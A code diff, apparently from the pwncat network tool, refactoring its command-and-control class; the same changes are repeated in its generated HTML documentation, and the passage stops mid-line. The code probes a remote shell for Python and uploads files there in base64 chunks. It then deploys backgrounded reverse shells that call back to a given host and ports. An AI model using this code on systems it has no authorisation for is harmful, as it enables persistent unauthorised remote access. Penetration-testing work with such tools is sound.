@@ -1777,7 +1777,7 @@ class Sock(_Singleton(&#34;SingletonMeta&#34;, (object,), {})):  # type: ignore
             # (SHUT_RDWR) 2 = Both
             self.__log.trace(&#34;Shutting down %s socket&#34;, name)  # type: ignore
             sock.shutdown(socket.SHUT_RDWR)
-        except (OSError, socket.error) as error:
+        except (OSError, socket.error):
             # We do not log errors here, as unconnected sockets cannot
             # be shutdown and we want to throw any socket at this function.
             pass
@@ -2775,6 +2775,12 @@ class IO(ABC):  # type: ignore
 # -------------------------------------------------------------------------------------------------
 class IONetwork(IO):
     &#34;&#34;&#34;Pwncat implementation based on custom Socket library.&#34;&#34;&#34;
+
+    @property
+    def net(self):
+        # type: () -&gt; Net
+        &#34;&#34;&#34;Returns instance of Net.&#34;&#34;&#34;
+        return self.__net
 
     # --------------------------------------------------------------------------
     # Constructor / Destructor
@@ -4273,8 +4279,8 @@ class CNC(object):
     __PYTHON_NAMES = [
         &#34;python&#34;,
         &#34;python2&#34;,
-        &#34;python2.7&#34;,
         &#34;python3&#34;,
+        &#34;python2.7&#34;,
         &#34;python3.5&#34;,
         &#34;python3.6&#34;,
         &#34;python3.7&#34;,
@@ -4287,42 +4293,64 @@ class CNC(object):
     # Properties
     # --------------------------------------------------------------------------
     @property
-    def python(self):
+    def remote_python(self):
         # type: () -&gt; str
         &#34;&#34;&#34;Discovered absolute Python remote path.&#34;&#34;&#34;
-        return self.__python
+        return self.__remote_python
 
     @property
-    def py3(self):
+    def remote_py3(self):
         # type: () -&gt; bool
         &#34;&#34;&#34;Is remote version Python3? Else it is Python2.&#34;&#34;&#34;
-        return self.__py3
+        return self.__remote_py3
 
     # --------------------------------------------------------------------------
     # Constructor
     # --------------------------------------------------------------------------
-    def __init__(self, enc, fsend, frecv):
-        # type: (StringEncoder, Callable[[bytes], None], Callable[..., Iterator[bytes]]) -&gt; None
+    def __init__(self, network):
+        # type: (IONetwork) -&gt; None
         &#34;&#34;&#34;Instantiate Command and Control class.
 
         Args:
-            enc (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
-            fsend (func): Socket send function.
-            frcev (func): Socket receive generator function.
+            network (IONetwork): Instance of IONetwork
 
         Raises:
             FileNotFoundError: if remote Python binary path is not found.
         &#34;&#34;&#34;
-        self.__enc = enc
-        self.__fsend = fsend
-        self.__frecv = frecv
+        self.__net = network
+        self.__log = logging.getLogger(__name__)
+        self.__py3 = sys.version_info &gt;= (3, 0)  # type: bool
+        self.__remote_prefix = []  # type: List[bytes]
 
+        # Values will by dynamically adjusted to find good balance between
+        # reliability and speed.
+        self.__recv_timeout = 0.5
+        self.__recv_retries = 3
+
+        # [1/4]
+        # TODO: Lock stdin until we have initialized
+
+        # [2/4] Check if there is data to be received first (e.g.: greeting)
+        self.print_info(&#34;Checking if remote sends greeting...&#34;)
+        greeting = self.flush_receive()
+        if greeting:
+            self.print_raw(b&#34;&#34;.join(greeting))
+            # Fix newlines if we had greetings
+            if greeting[-1].rstrip(b&#34;\n&#34;) == greeting[-1]:
+                self.print_raw(b&#34;\n&#34;)
+
+        # [3/4] Check if the remote sends a prefix with every reply
+        self.__set_remote_prefix()
+
+        # [4/4] Find potential Python versions
         if not self.__set_remote_python_path():
             self.print_info(&#34;No Python has been found. Aborting and handing over to current shell.&#34;)
+            self.flush_receive()
             raise FileNotFoundError()
+        self.flush_receive()
 
     # --------------------------------------------------------------------------
-    # Public Functions
+    # Print Functions
     # --------------------------------------------------------------------------
     def print_info(self, message=None, newline=True, erase=False):
         # type: (Optional[str], bool, bool) -&gt; None
@@ -4346,16 +4374,141 @@ class CNC(object):
             print(&#34;{}{}&#34;.format(prefix, message), end=end)
             sys.stdout.flush()
 
-    def remote_command(self, command):
-        # type: (str) -&gt; None
-        &#34;&#34;&#34;Run remote command with correct linefeeds.
+    def print_raw(self, message):
+        # type: (bytes) -&gt; None
+        &#34;&#34;&#34;Print a message to the local screen without color/prefix.
+
+        Args:
+            message (bytes): The message to print.
+        &#34;&#34;&#34;
+        if self.__py3:
+            sys.stdout.buffer.write(message)
+        else:
+            # For issues with flush (when using tail -F or equal) see links below:
+            # https://stackoverflow.com/questions/26692284
+            # https://docs.python.org/3/library/signal.html#note-on-sigpipe
+            print(message, end=&#34;&#34;)
+
+        try:
+            sys.stdout.flush()
+        except IOError:
+            # Python flushes standard streams on exit; redirect remaining output
+            # to devnull to avoid another broken pipe at shutdown
+            devnull = os.open(os.devnull, os.O_WRONLY)
+            os.dup2(devnull, sys.stdout.fileno())
+
+    # --------------------------------------------------------------------------
+    # Network Functions
+    # --------------------------------------------------------------------------
+    def send(self, data):
+        # type: (bytes) -&gt; int
+        &#34;&#34;&#34;Send data through a connected (TCP) or unconnected (UDP) socket.
+
+        Args:
+            data (bytes): The data to send.
+
+        Returns:
+            int: Returns total bytes sent.
+
+        Raises:
+            socket.error:   Except here when unconnected or connection was forcibly closed.
+        &#34;&#34;&#34;
+        return self.__net.net.send(data)
+
+    def flush_receive(self):
+        # type: () -&gt; List[bytes]
+        &#34;&#34;&#34;Try to reveive everything which is currently being sent from remote.
+
+        Returns:
+            List[bytes]: Returns a list of bytes of received data.
+
+        Raises:
+            socket.error:   Except here when unconnected or connection was forcibly closed.
+        &#34;&#34;&#34;
+        return self.send_recv(None, False)
+
+    def send_recv(self, data, strip_prefix=True):
+        # type: (Optional[bytes], bool) -&gt; List[bytes]
+        &#34;&#34;&#34;Send data through a connected (TCP) or unconnected (UDP) socket and receive all replies.
+
+        Args:
+            data (None|bytes): The data to send. If None, will skip sending.
+            strip_prefix (bool): Strip remote prefix from received data?
+
+        Returns:
+            List[bytes]: Returns a list of bytes of received data.
+
+        Raises:
+            socket.error:   Except here when unconnected or connection was forcibly closed.
+        &#34;&#34;&#34;
+        # [1/3] Send
+        if data is not None:
+            self.__net.net.send(data)
+
+        # [2/3] Receive actual reply
+        responses = []
+        curr_retry = 0
+
+        while curr_retry &lt; self.__recv_retries:
+            try:
+                response = self.__net.net.receive()
+            except socket.timeout:
+                curr_retry += 1
+                time.sleep(self.__recv_timeout)
+            # On successful read, we can determine to adjust timings.
+            else:
+                if response:
+                    responses.append(response)
+
+                    # If retries were necessary, we will increase the time-out.
+                    if curr_retry &gt; 0:
+                        self.__recv_timeout += self.__recv_timeout / 2
+
+                    # If ne retries were necessary, we can descrease the timeout a bit
+                    if curr_retry == 0:
+                        self.__recv_timeout -= self.__recv_timeout / 2
+
+                    # Reset the retry counter for next line to read
+                    curr_retry = 0
+
+        # [3/3] Remove remote ends prefix (if it sends something like it)
+        # We iterate reversed of responses and check if the new line prefix(es)
+        # are present at the end.
+        # This is because the prefix(es) is always received last.
+        if self.__remote_prefix and strip_prefix:
+            for idx, item in enumerate(self.__remote_prefix):
+                rev_idx = (idx + 1) * -1
+                # Remove prefix part from right (and strip whitesspace)
+                responses[rev_idx] = responses[rev_idx].rstrip(self.__remote_prefix[rev_idx])
+                responses[rev_idx] = responses[rev_idx].rstrip()
+
+                # Ensure empty elements are removed
+                responses = [item for item in responses if item]
+
+        # Return list of respones
+        return responses
+
+    # --------------------------------------------------------------------------
+    # High-level Functions
+    # --------------------------------------------------------------------------
+    def remote_command(self, command, output):
+        # type: (str, bool) -&gt; Optional[List[bytes]]
+        &#34;&#34;&#34;Run remote command with correct linefeeds and receive response lines.
 
         Args:
             command (str): The command to execute on the remote end.
+            output (bool): Receive output from command?
         &#34;&#34;&#34;
         # TODO: determine remote host line feeds and set accordingly.
         # TODO: handle exception
-        self.__fsend(StringEncoder.encode(command + &#34;\n&#34;))
+        command = command.rstrip(&#34;\r\n&#34;)
+        command = command.rstrip(&#34;\r&#34;)
+        command = command.rstrip(&#34;\n&#34;)
+        command = command + &#34;\n&#34;
+        if output:
+            return self.send_recv(StringEncoder.encode(command))
+        self.send(StringEncoder.encode(command))
+        return None
 
     def create_remote_tmpfile(self):
         # type: () -&gt; Optional[str]
@@ -4365,7 +4518,7 @@ class CNC(object):
             str or None: Returns path on success or None on error.
         &#34;&#34;&#34;
         command = []
-        command.append(&#34;{} -c &#39;&#34;.format(self.__python))
+        command.append(&#34;{} -c &#39;&#34;.format(self.__remote_python))
         command.append(&#34;import tempfile;&#34;)
         command.append(&#34;h,f=tempfile.mkstemp();&#34;)
         if self.__py3:
@@ -4373,14 +4526,14 @@ class CNC(object):
         else:
             command.append(&#34;print f;&#34;)
         command.append(&#34;&#39;&#34;)
-        self.remote_command(&#34;&#34;.join(command))
 
         self.print_info(&#34;Creating tmpfile:&#34;, False, True)
-        for response in self.__frecv():
-            if response:
-                tmpfile = StringEncoder.decode(response).rstrip()
-                self.print_info(&#34;Creating tmpfile: {}&#34;.format(tmpfile), True, True)
-                return tmpfile
+        response = self.remote_command(&#34;&#34;.join(command), True)
+
+        if response is not None and len(response) == 1:
+            tmpfile = StringEncoder.decode(response[0]).rstrip()
+            self.print_info(&#34;Creating tmpfile: {}&#34;.format(tmpfile), True, True)
+            return tmpfile
 
         self.print_info(&#34;Failed to create tmpfile&#34;, True, True)
         return None
@@ -4396,7 +4549,7 @@ class CNC(object):
         Returns:
             bool: Returns `True` on success and `False` on failure.
         &#34;&#34;&#34;
-        assert self.__python is not None
+        assert self.__remote_python is not None
         assert self.__py3 is not None
 
         rpath_b64 = self.create_remote_tmpfile()
@@ -4411,6 +4564,20 @@ class CNC(object):
     # --------------------------------------------------------------------------
     # Private Functions
     # --------------------------------------------------------------------------
+    def __set_remote_prefix(self):
+        # type: () -&gt; None
+        &#34;&#34;&#34;Determines if the remote always sends a specific prefix with its other data.&#34;&#34;&#34;
+        self.__remote_prefix = []
+        self.print_info(&#34;Checking if remote sends prefix to every request...&#34;)
+        prefix = self.send_recv(b&#34;\n&#34;)
+        if prefix:
+            self.print_info(&#34;Remote prefix:&#34;)
+            self.print_raw(StringEncoder.encode(repr(prefix)))
+            self.print_raw(b&#34;\n&#34;)
+            self.__remote_prefix = prefix
+        else:
+            self.print_info(&#34;Remote does not send prefix&#34;)
+
     def __set_remote_python_path(self):
         # type: () -&gt; bool
         &#34;&#34;&#34;Enumerate remote Python binary.
@@ -4424,13 +4591,17 @@ class CNC(object):
 
                 python = path + &#34;/&#34; + name
                 self.print_info(&#34;Probing for: {}&#34;.format(python))
-                self.remote_command(&#34;test -f {p} &amp;&amp; echo {p} || echo;&#34;.format(p=python))
+                rpath_lines = self.remote_command(
+                    &#34;test -f {p} &amp;&amp; echo {p} || echo;&#34;.format(p=python), True
+                )
+                if rpath_lines is not None and rpath_lines:
+                    # We expect a length of one
+                    if len(rpath_lines) &gt; 1:
+                        self.__log.error(&#34;Response was more than one line: %s&#34;, repr(rpath_lines))
 
-                for byte in self.__frecv():
-
-                    response = StringEncoder.decode(byte)
-                    match = re.search(r&#34;^([.0-9]+)&#34;, response)
-                    if StringEncoder.rstrip(response) == StringEncoder.rstrip(python):
+                    remote_path = rpath_lines[0]
+                    # Potential python candidate
+                    if StringEncoder.rstrip(remote_path) == StringEncoder.encode(python):
                         self.print_info(&#34;Potential path: {}&#34;.format(python))
                         command = []
                         command.append(&#34;{} -c &#39;&#34;.format(python))
@@ -4438,25 +4609,33 @@ class CNC(object):
                         command.append(&#34;import sys;&#34;)
                         command.append(&#34;v=sys.version_info;&#34;)
                         command.append(&#39;print(&#34;{}.{}.{}&#34;.format(v[0], v[1], v[2]));\&#39;&#39;)
-                        data = &#34;&#34;.join(command)
-                        self.remote_command(data)
-                        continue
-                    if match:
-                        version = match.group(1)
-                        if version[0] == &#34;2&#34;:
-                            self.__py3 = False
-                        elif version[0] == &#34;3&#34;:
-                            self.__py3 = True
-                        else:
-                            self.print_info(&#34;Could not determine major version: {}&#34;.format(version))
-                            return False
-                        self.print_info(
-                            &#34;Found valid Python{} version: {}&#34;.format(version[0], version)
-                        )
-                        self.__python = python
-                        return True
-                    # Nothing matched, break the innter loop
-                    break
+                        rversion_lines = self.remote_command(&#34;&#34;.join(command), True)
+
+                        if rversion_lines is not None and rversion_lines:
+                            # We expect a length of one
+                            if len(rversion_lines) &gt; 1:
+                                self.__log.error(
+                                    &#34;Response was more than one line: %s&#34;, repr(rversion_lines)
+                                )
+                            remote_version = rversion_lines[0]
+                            match = re.search(b&#34;^([.0-9]+)&#34;, remote_version)
+                            # Potential version candidate
+                            if match:
+                                version = StringEncoder.decode(match.group(1))
+                                if version[0] == &#34;2&#34;:
+                                    self.__remote_py3 = False
+                                elif version[0] == &#34;3&#34;:
+                                    self.__remote_py3 = True
+                                else:
+                                    self.print_info(
+                                        &#34;Could not determine major version: {}&#34;.format(version)
+                                    )
+                                    continue
+                                self.print_info(
+                                    &#34;Found valid Python{} version: {}&#34;.format(version[0], version)
+                                )
+                                self.__remote_python = python
+                                return True
         return False
 
     def __upload_file_base_64_encoded(self, lpath, rpath):
@@ -4481,11 +4660,12 @@ class CNC(object):
                 )
                 b64 = StringEncoder.decode(base64.b64encode(StringEncoder.encode(line)))
                 if first:
-                    self.remote_command(&#39;echo &#34;{}&#34; &gt; {}&#39;.format(b64, rpath))
+                    self.remote_command(&#39;echo &#34;{}&#34; &gt; {}&#39;.format(b64, rpath), False)
                     first = False
                 else:
-                    self.remote_command(&#39;echo &#34;{}&#34; &gt;&gt; {}&#39;.format(b64, rpath))
+                    self.remote_command(&#39;echo &#34;{}&#34; &gt;&gt; {}&#39;.format(b64, rpath), False)
                 curr += 1
+        self.flush_receive()
         self.print_info()
         # TODO: md5 check if this is legit
         return True
@@ -4502,17 +4682,20 @@ class CNC(object):
             bool: Returns `True` on success or `False` on failure.
         &#34;&#34;&#34;
         command = []
-        command.append(&#34;{} -c &#39;import base64;&#34;.format(self.__python))
+        command.append(&#34;{} -c &#39;import base64;&#34;.format(self.__remote_python))
         command.append(&#39;f=open(&#34;{}&#34;, &#34;r&#34;);&#39;.format(rpath_source))
         command.append(&#34;lines = f.readlines();&#34;)
-        if self.__py3:
-            command.append(&#39;print(&#34;&#34;.join([base64.b64decode(l.encode()) for l in lines]));\&#39;&#39;)
+        if self.__remote_py3:
+            command.append(
+                &#39;print((b&#34;&#34;.join([base64.b64decode(l.encode()) for l in lines])).decode());\&#39;&#39;
+            )
         else:
             command.append(&#39;print &#34;&#34;.join([base64.b64decode(l) for l in lines]);\&#39;&#39;)
         command.append(&#34;&gt; {}&#34;.format(rpath_target))
 
         self.print_info(&#34;Decoding: {} -&gt; {}&#34;.format(rpath_source, rpath_target))
-        self.remote_command(&#34;&#34;.join(command))
+        self.remote_command(&#34;&#34;.join(command), False)
+        self.flush_receive()
         # TODO: validate via md5
         return True
 
@@ -4525,16 +4708,14 @@ class CNCAutoDeploy(CNC):
 
     def __init__(
         self,
-        enc,  # type: StringEncoder
-        send,  # type: Callable[[bytes], None]
-        recv,  # type: Callable[[], Iterator[bytes]]
+        network,  # type: IONetwork
         cmd,  # type: str
         host,  # type: str
         ports,  # type: List[int]
     ):
         # type: (...) -&gt; None
         try:
-            super(CNCAutoDeploy, self).__init__(enc, send, recv)
+            super(CNCAutoDeploy, self).__init__(network)
         except FileNotFoundError:
             return
 
@@ -4553,7 +4734,7 @@ class CNCAutoDeploy(CNC):
         for port in ports:
             command = []
             command.append(&#34;nohup&#34;)
-            command.append(self.python)
+            command.append(self.remote_python)
             command.append(remote_path)
             command.append(host)
             command.append(str(port))
@@ -4563,7 +4744,7 @@ class CNCAutoDeploy(CNC):
             command.append(&#34;&amp;&#34;)
             data = &#34; &#34;.join(command)
             print(&#34;Starting pwncat rev shell: {}&#34;.format(data))
-            self.remote_command(data)
+            self.remote_command(data, False)
 
 
 # #################################################################################################
@@ -5812,7 +5993,7 @@ def main():
         if args.self_inject:
             cnc_cmd, cnc_host, cnc_port = args.self_inject.split(&#34;:&#34;)
             cnc_ports = ArgValidator.get_port_list_from_string(cnc_port)
-            CNCAutoDeploy(enc, net.consumer, net.producer, cnc_cmd, cnc_host, cnc_ports)
+            CNCAutoDeploy(net, cnc_cmd, cnc_host, cnc_ports)
 
         if args.http:
             trans_recv = [TransformHttpUnpack({})] + transformers
@@ -6830,7 +7011,7 @@ The default is to send a null byte sting: &#39;\\0&#39;.
         if args.self_inject:
             cnc_cmd, cnc_host, cnc_port = args.self_inject.split(&#34;:&#34;)
             cnc_ports = ArgValidator.get_port_list_from_string(cnc_port)
-            CNCAutoDeploy(enc, net.consumer, net.producer, cnc_cmd, cnc_host, cnc_ports)
+            CNCAutoDeploy(net, cnc_cmd, cnc_host, cnc_ports)
 
         if args.http:
             trans_recv = [TransformHttpUnpack({})] + transformers
@@ -7397,19 +7578,15 @@ def type_tos(value):
 </dd>
 <dt id="pwncat.CNC"><code class="flex name class">
 <span>class <span class="ident">CNC</span></span>
-<span>(</span><span>enc, fsend, frecv)</span>
+<span>(</span><span>network)</span>
 </code></dt>
 <dd>
 <div class="desc"><p>Command and Control base class.</p>
 <p>Instantiate Command and Control class.</p>
 <h2 id="args">Args</h2>
 <dl>
-<dt><strong><code>enc</code></strong> :&ensp;<code><a title="pwncat.StringEncoder" href="#pwncat.StringEncoder">StringEncoder</a></code></dt>
-<dd>Instance of StringEncoder (Python2/3 str/byte compat).</dd>
-<dt><strong><code>fsend</code></strong> :&ensp;<code>func</code></dt>
-<dd>Socket send function.</dd>
-<dt><strong><code>frcev</code></strong> :&ensp;<code>func</code></dt>
-<dd>Socket receive generator function.</dd>
+<dt><strong><code>network</code></strong> :&ensp;<code><a title="pwncat.IONetwork" href="#pwncat.IONetwork">IONetwork</a></code></dt>
+<dd>Instance of IONetwork</dd>
 </dl>
 <h2 id="raises">Raises</h2>
 <dl>
@@ -7449,8 +7626,8 @@ def type_tos(value):
     __PYTHON_NAMES = [
         &#34;python&#34;,
         &#34;python2&#34;,
-        &#34;python2.7&#34;,
         &#34;python3&#34;,
+        &#34;python2.7&#34;,
         &#34;python3.5&#34;,
         &#34;python3.6&#34;,
         &#34;python3.7&#34;,
@@ -7463,42 +7640,64 @@ def type_tos(value):
     # Properties
     # --------------------------------------------------------------------------
     @property
-    def python(self):
+    def remote_python(self):
         # type: () -&gt; str
         &#34;&#34;&#34;Discovered absolute Python remote path.&#34;&#34;&#34;
-        return self.__python
+        return self.__remote_python
 
     @property
-    def py3(self):
+    def remote_py3(self):
         # type: () -&gt; bool
         &#34;&#34;&#34;Is remote version Python3? Else it is Python2.&#34;&#34;&#34;
-        return self.__py3
+        return self.__remote_py3
 
     # --------------------------------------------------------------------------
     # Constructor
     # --------------------------------------------------------------------------
-    def __init__(self, enc, fsend, frecv):
-        # type: (StringEncoder, Callable[[bytes], None], Callable[..., Iterator[bytes]]) -&gt; None
+    def __init__(self, network):
+        # type: (IONetwork) -&gt; None
         &#34;&#34;&#34;Instantiate Command and Control class.
 
         Args:
-            enc (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
-            fsend (func): Socket send function.
-            frcev (func): Socket receive generator function.
+            network (IONetwork): Instance of IONetwork
 
         Raises:
             FileNotFoundError: if remote Python binary path is not found.
         &#34;&#34;&#34;
-        self.__enc = enc
-        self.__fsend = fsend
-        self.__frecv = frecv
+        self.__net = network
+        self.__log = logging.getLogger(__name__)
+        self.__py3 = sys.version_info &gt;= (3, 0)  # type: bool
+        self.__remote_prefix = []  # type: List[bytes]
 
+        # Values will by dynamically adjusted to find good balance between
+        # reliability and speed.
+        self.__recv_timeout = 0.5
+        self.__recv_retries = 3
+
+        # [1/4]
+        # TODO: Lock stdin until we have initialized
+
+        # [2/4] Check if there is data to be received first (e.g.: greeting)
+        self.print_info(&#34;Checking if remote sends greeting...&#34;)
+        greeting = self.flush_receive()
+        if greeting:
+            self.print_raw(b&#34;&#34;.join(greeting))
+            # Fix newlines if we had greetings
+            if greeting[-1].rstrip(b&#34;\n&#34;) == greeting[-1]:
+                self.print_raw(b&#34;\n&#34;)
+
+        # [3/4] Check if the remote sends a prefix with every reply
+        self.__set_remote_prefix()
+
+        # [4/4] Find potential Python versions
         if not self.__set_remote_python_path():
             self.print_info(&#34;No Python has been found. Aborting and handing over to current shell.&#34;)
+            self.flush_receive()
             raise FileNotFoundError()
+        self.flush_receive()
 
     # --------------------------------------------------------------------------
-    # Public Functions
+    # Print Functions
     # --------------------------------------------------------------------------
     def print_info(self, message=None, newline=True, erase=False):
         # type: (Optional[str], bool, bool) -&gt; None
@@ -7522,16 +7721,141 @@ def type_tos(value):
             print(&#34;{}{}&#34;.format(prefix, message), end=end)
             sys.stdout.flush()
 
-    def remote_command(self, command):
-        # type: (str) -&gt; None
-        &#34;&#34;&#34;Run remote command with correct linefeeds.
+    def print_raw(self, message):
+        # type: (bytes) -&gt; None
+        &#34;&#34;&#34;Print a message to the local screen without color/prefix.
+
+        Args:
+            message (bytes): The message to print.
+        &#34;&#34;&#34;
+        if self.__py3:
+            sys.stdout.buffer.write(message)
+        else:
+            # For issues with flush (when using tail -F or equal) see links below:
+            # https://stackoverflow.com/questions/26692284
+            # https://docs.python.org/3/library/signal.html#note-on-sigpipe
+            print(message, end=&#34;&#34;)
+
+        try:
+            sys.stdout.flush()
+        except IOError:
+            # Python flushes standard streams on exit; redirect remaining output
+            # to devnull to avoid another broken pipe at shutdown
+            devnull = os.open(os.devnull, os.O_WRONLY)
+            os.dup2(devnull, sys.stdout.fileno())
+
+    # --------------------------------------------------------------------------
+    # Network Functions
+    # --------------------------------------------------------------------------
+    def send(self, data):
+        # type: (bytes) -&gt; int
+        &#34;&#34;&#34;Send data through a connected (TCP) or unconnected (UDP) socket.
+
+        Args:
+            data (bytes): The data to send.
+
+        Returns:
+            int: Returns total bytes sent.
+
+        Raises:
+            socket.error:   Except here when unconnected or connection was forcibly closed.
+        &#34;&#34;&#34;
+        return self.__net.net.send(data)
+
+    def flush_receive(self):
+        # type: () -&gt; List[bytes]
+        &#34;&#34;&#34;Try to reveive everything which is currently being sent from remote.
+
+        Returns:
+            List[bytes]: Returns a list of bytes of received data.
+
+        Raises:
+            socket.error:   Except here when unconnected or connection was forcibly closed.
+        &#34;&#34;&#34;
+        return self.send_recv(None, False)
+
+    def send_recv(self, data, strip_prefix=True):
+        # type: (Optional[bytes], bool) -&gt; List[bytes]
+        &#34;&#34;&#34;Send data through a connected (TCP) or unconnected (UDP) socket and receive all replies.
+
+        Args:
+            data (None|bytes): The data to send. If None, will skip sending.
+            strip_prefix (bool): Strip remote prefix from received data?
+
+        Returns:
+            List[bytes]: Returns a list of bytes of received data.
+
+        Raises:
+            socket.error:   Except here when unconnected or connection was forcibly closed.
+        &#34;&#34;&#34;
+        # [1/3] Send
+        if data is not None:
+            self.__net.net.send(data)
+
+        # [2/3] Receive actual reply
+        responses = []
+        curr_retry = 0
+
+        while curr_retry &lt; self.__recv_retries:
+            try:
+                response = self.__net.net.receive()
+            except socket.timeout:
+                curr_retry += 1
+                time.sleep(self.__recv_timeout)
+            # On successful read, we can determine to adjust timings.
+            else:
+                if response:
+                    responses.append(response)
+
+                    # If retries were necessary, we will increase the time-out.
+                    if curr_retry &gt; 0:
+                        self.__recv_timeout += self.__recv_timeout / 2
+
+                    # If ne retries were necessary, we can descrease the timeout a bit
+                    if curr_retry == 0:
+                        self.__recv_timeout -= self.__recv_timeout / 2
+
+                    # Reset the retry counter for next line to read
+                    curr_retry = 0
+
+        # [3/3] Remove remote ends prefix (if it sends something like it)
+        # We iterate reversed of responses and check if the new line prefix(es)
+        # are present at the end.
+        # This is because the prefix(es) is always received last.
+        if self.__remote_prefix and strip_prefix:
+            for idx, item in enumerate(self.__remote_prefix):
+                rev_idx = (idx + 1) * -1
+                # Remove prefix part from right (and strip whitesspace)
+                responses[rev_idx] = responses[rev_idx].rstrip(self.__remote_prefix[rev_idx])
+                responses[rev_idx] = responses[rev_idx].rstrip()
+
+                # Ensure empty elements are removed
+                responses = [item for item in responses if item]
+
+        # Return list of respones
+        return responses
+
+    # --------------------------------------------------------------------------
+    # High-level Functions
+    # --------------------------------------------------------------------------
+    def remote_command(self, command, output):
+        # type: (str, bool) -&gt; Optional[List[bytes]]
+        &#34;&#34;&#34;Run remote command with correct linefeeds and receive response lines.
 
         Args:
             command (str): The command to execute on the remote end.
+            output (bool): Receive output from command?
         &#34;&#34;&#34;
         # TODO: determine remote host line feeds and set accordingly.
         # TODO: handle exception
-        self.__fsend(StringEncoder.encode(command + &#34;\n&#34;))
+        command = command.rstrip(&#34;\r\n&#34;)
+        command = command.rstrip(&#34;\r&#34;)
+        command = command.rstrip(&#34;\n&#34;)
+        command = command + &#34;\n&#34;
+        if output:
+            return self.send_recv(StringEncoder.encode(command))
+        self.send(StringEncoder.encode(command))
+        return None
 
     def create_remote_tmpfile(self):
         # type: () -&gt; Optional[str]
@@ -7541,7 +7865,7 @@ def type_tos(value):
             str or None: Returns path on success or None on error.
         &#34;&#34;&#34;
         command = []
-        command.append(&#34;{} -c &#39;&#34;.format(self.__python))
+        command.append(&#34;{} -c &#39;&#34;.format(self.__remote_python))
         command.append(&#34;import tempfile;&#34;)
         command.append(&#34;h,f=tempfile.mkstemp();&#34;)
         if self.__py3:
@@ -7549,14 +7873,14 @@ def type_tos(value):
         else:
             command.append(&#34;print f;&#34;)
         command.append(&#34;&#39;&#34;)
-        self.remote_command(&#34;&#34;.join(command))
 
         self.print_info(&#34;Creating tmpfile:&#34;, False, True)
-        for response in self.__frecv():
-            if response:
-                tmpfile = StringEncoder.decode(response).rstrip()
-                self.print_info(&#34;Creating tmpfile: {}&#34;.format(tmpfile), True, True)
-                return tmpfile
+        response = self.remote_command(&#34;&#34;.join(command), True)
+
+        if response is not None and len(response) == 1:
+            tmpfile = StringEncoder.decode(response[0]).rstrip()
+            self.print_info(&#34;Creating tmpfile: {}&#34;.format(tmpfile), True, True)
+            return tmpfile
 
         self.print_info(&#34;Failed to create tmpfile&#34;, True, True)
         return None
@@ -7572,7 +7896,7 @@ def type_tos(value):
         Returns:
             bool: Returns `True` on success and `False` on failure.
         &#34;&#34;&#34;
-        assert self.__python is not None
+        assert self.__remote_python is not None
         assert self.__py3 is not None
 
         rpath_b64 = self.create_remote_tmpfile()
@@ -7587,6 +7911,20 @@ def type_tos(value):
     # --------------------------------------------------------------------------
     # Private Functions
     # --------------------------------------------------------------------------
+    def __set_remote_prefix(self):
+        # type: () -&gt; None
+        &#34;&#34;&#34;Determines if the remote always sends a specific prefix with its other data.&#34;&#34;&#34;
+        self.__remote_prefix = []
+        self.print_info(&#34;Checking if remote sends prefix to every request...&#34;)
+        prefix = self.send_recv(b&#34;\n&#34;)
+        if prefix:
+            self.print_info(&#34;Remote prefix:&#34;)
+            self.print_raw(StringEncoder.encode(repr(prefix)))
+            self.print_raw(b&#34;\n&#34;)
+            self.__remote_prefix = prefix
+        else:
+            self.print_info(&#34;Remote does not send prefix&#34;)
+
     def __set_remote_python_path(self):
         # type: () -&gt; bool
         &#34;&#34;&#34;Enumerate remote Python binary.
@@ -7600,13 +7938,17 @@ def type_tos(value):
 
                 python = path + &#34;/&#34; + name
                 self.print_info(&#34;Probing for: {}&#34;.format(python))
-                self.remote_command(&#34;test -f {p} &amp;&amp; echo {p} || echo;&#34;.format(p=python))
+                rpath_lines = self.remote_command(
+                    &#34;test -f {p} &amp;&amp; echo {p} || echo;&#34;.format(p=python), True
+                )
+                if rpath_lines is not None and rpath_lines:
+                    # We expect a length of one
+                    if len(rpath_lines) &gt; 1:
+                        self.__log.error(&#34;Response was more than one line: %s&#34;, repr(rpath_lines))
 
-                for byte in self.__frecv():
-
-                    response = StringEncoder.decode(byte)
-                    match = re.search(r&#34;^([.0-9]+)&#34;, response)
-                    if StringEncoder.rstrip(response) == StringEncoder.rstrip(python):
+                    remote_path = rpath_lines[0]
+                    # Potential python candidate
+                    if StringEncoder.rstrip(remote_path) == StringEncoder.encode(python):
                         self.print_info(&#34;Potential path: {}&#34;.format(python))
                         command = []
                         command.append(&#34;{} -c &#39;&#34;.format(python))
@@ -7614,25 +7956,33 @@ def type_tos(value):
                         command.append(&#34;import sys;&#34;)
                         command.append(&#34;v=sys.version_info;&#34;)
                         command.append(&#39;print(&#34;{}.{}.{}&#34;.format(v[0], v[1], v[2]));\&#39;&#39;)
-                        data = &#34;&#34;.join(command)
-                        self.remote_command(data)
-                        continue
-                    if match:
-                        version = match.group(1)
-                        if version[0] == &#34;2&#34;:
-                            self.__py3 = False
-                        elif version[0] == &#34;3&#34;:
-                            self.__py3 = True
-                        else:
-                            self.print_info(&#34;Could not determine major version: {}&#34;.format(version))
-                            return False
-                        self.print_info(
-                            &#34;Found valid Python{} version: {}&#34;.format(version[0], version)
-                        )
-                        self.__python = python
-                        return True
-                    # Nothing matched, break the innter loop
-                    break
+                        rversion_lines = self.remote_command(&#34;&#34;.join(command), True)
+
+                        if rversion_lines is not None and rversion_lines:
+                            # We expect a length of one
+                            if len(rversion_lines) &gt; 1:
+                                self.__log.error(
+                                    &#34;Response was more than one line: %s&#34;, repr(rversion_lines)
+                                )
+                            remote_version = rversion_lines[0]
+                            match = re.search(b&#34;^([.0-9]+)&#34;, remote_version)
+                            # Potential version candidate
+                            if match:
+                                version = StringEncoder.decode(match.group(1))
+                                if version[0] == &#34;2&#34;:
+                                    self.__remote_py3 = False
+                                elif version[0] == &#34;3&#34;:
+                                    self.__remote_py3 = True
+                                else:
+                                    self.print_info(
+                                        &#34;Could not determine major version: {}&#34;.format(version)
+                                    )
+                                    continue
+                                self.print_info(
+                                    &#34;Found valid Python{} version: {}&#34;.format(version[0], version)
+                                )
+                                self.__remote_python = python
+                                return True
         return False
 
     def __upload_file_base_64_encoded(self, lpath, rpath):
@@ -7657,11 +8007,12 @@ def type_tos(value):
                 )
                 b64 = StringEncoder.decode(base64.b64encode(StringEncoder.encode(line)))
                 if first:
-                    self.remote_command(&#39;echo &#34;{}&#34; &gt; {}&#39;.format(b64, rpath))
